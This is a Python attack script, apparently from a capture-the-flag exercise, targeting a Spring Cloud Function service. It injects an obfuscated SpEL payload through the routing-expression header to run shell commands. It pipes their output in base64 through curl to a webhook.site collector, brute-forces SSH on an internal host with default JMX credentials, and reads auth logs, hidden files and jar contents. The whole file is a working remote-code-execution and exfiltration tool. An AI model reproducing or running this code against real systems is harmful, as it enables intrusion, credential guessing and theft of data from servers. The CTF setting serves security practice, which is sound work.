#!/usr/bin/env python3
"""
CTF Chile - Probar credenciales JMX y búsqueda final de flags
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: {WH}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:25} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] Probando credenciales del template JMX...")

# Credenciales del template JMX
jmx_creds = [
    ("monitorRole", "QED"),
    ("controlRole", "R&D"),
    ("monitor", "QED"),
    ("control", "R&D"),
    ("root", "QED"),
    ("root", "R&D"),
    ("admin", "QED"),
    ("admin", "R&D")
]

for user, password in jmx_creds:
    probe(f"ssh_{user}_{password.replace('&', 'and')}", f"timeout 6 sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {user}@10.160.209.1 'echo LOGIN_SUCCESS_{user} && hostname && whoami' 2>/dev/null || echo 'AUTH_FAILED_{user}:{password}'")

print("[*] Búsqueda exhaustiva final de flags en el host actual...")

# Búsqueda final de flags con diferentes patrones
probe("flag_pattern1", "find / -type f 2>/dev/null | xargs grep -l 'ctfchile{' 2>/dev/null | head -5")
probe("flag_pattern2", "grep -r 'CTFChile{' / 2>/dev/null | head -5")
probe("flag_pattern3", "strings /app/app.jar | grep -i 'flag\\|ctf' | head -10")

print("[*] Verificando archivos ocultos y de configuración...")

# Archivos ocultos que podrían contener flags
probe("hidden_files_app", "find /app -name '.*' -type f 2>/dev/null | xargs cat 2>/dev/null")
probe("hidden_files_tmp", "find /tmp -name '.*' -type f 2>/dev/null | xargs cat 2>/dev/null")

print("[*] Probando comandos de administración...")

# Comandos que podrían revelar información administrativa
probe("systemctl_status", "systemctl status 2>/dev/null | head -10")
probe("docker_info", "docker info 2>/dev/null || echo 'NO_DOCKER'")

print("[*] Verificando logs del sistema...")

# Logs que podrían tener información útil
probe("auth_logs", "cat /var/log/auth.log 2>/dev/null | tail -10")
probe("syslog", "cat /var/log/syslog 2>/dev/null | grep -i flag | head -5")

print("[*] Intentando trigger condiciones especiales...")

# Condiciones que podrían triggear un flag
probe("trigger_error", "curl -s -X POST http://localhost:8080/api/error 2>/dev/null || echo 'NO_ERROR_ENDPOINT'")
probe("trigger_debug", "curl -s -X POST http://localhost:8080/debug 2>/dev/null || echo 'NO_DEBUG_ENDPOINT'")

time.sleep(15)

# Recoger respuestas
print("[*] Recogiendo respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=30", timeout=10)
data = r.json().get("data", [])

flags_found = []
successful_logins = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print("TAG:", path)
    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                flags_found.append((path, decoded))
                print("\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

            # Detectar logins exitosos
            if "LOGIN_SUCCESS" in decoded:
                successful_logins.append((path, decoded))
                print("🔑 LOGIN SSH EXITOSO!")

        except Exception as e:
            print(f"(decode error) {raw[:150]}")
    else:
        print("(sin payload)")

print(f"\n[*] Manual review: https://webhook.site/#!/{UUID}")

if flags_found:
    print(f"\n🎉🎉🎉 FLAGS ENCONTRADOS: {len(flags_found)} 🎉🎉🎉")
    for path, flag in flags_found:
        print(f"  FUENTE: {path}")
        print(f"  FLAG: {flag.strip()}")

if successful_logins:
    print(f"\n🔑 LOGINS SSH EXITOSOS: {len(successful_logins)}")
    for path, login in successful_logins:
        print(f"  {path}: {login.strip()}")

if not flags_found and not successful_logins:
    print("\n💭 No se encontraron flags ni accesos SSH. El flag podría requerir un método diferente.")